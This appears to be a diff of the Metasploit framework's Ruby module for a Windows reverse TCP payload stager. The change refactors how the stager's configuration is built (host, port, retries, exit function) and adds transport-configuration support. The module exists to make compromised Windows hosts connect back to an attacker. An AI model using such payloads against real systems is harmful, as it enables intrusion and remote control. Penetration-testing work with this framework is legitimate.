@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
+require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
@@ -14,39 +15,33 @@ module Msf
 
 module Payload::Windows::ReverseTcp
 
+  include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
 
   #
-  # Register reverse_tcp specific options
-  #
-  def initialize(*args)
-    super
-  end
-
-  #
   # Generate the first stage
   #
   def generate
-    # Generate the simple version of this stager if we don't have enough space
-    if self.available_space.nil? || required_space > self.available_space
-      return generate_reverse_tcp(
-        port: datastore['LPORT'],
-        host: datastore['LHOST'],
-        retry_count: datastore['ReverseConnectRetries'],
-      )
-    end
-
     conf = {
-      host: datastore['LHOST'],
-      port: datastore['LPORT'],
+      port:        datastore['LPORT'],
+      host:        datastore['LHOST'],
       retry_count: datastore['ReverseConnectRetries'],
-      exitfunk: datastore['EXITFUNC'],
-      reliable: true
+      reliable:    false
     }
 
+    # Generate the advanced stager if we have space
+    unless self.available_space.nil? || required_space > self.available_space
+      conf[:exitfunk] = datastore['EXITFUNC']
+      conf[:reliable] = true
+    end
+
     generate_reverse_tcp(conf)
+  end
+
+  def transport_config(opts={})
+    transport_config_reverse_tcp(opts)
   end
 
   #
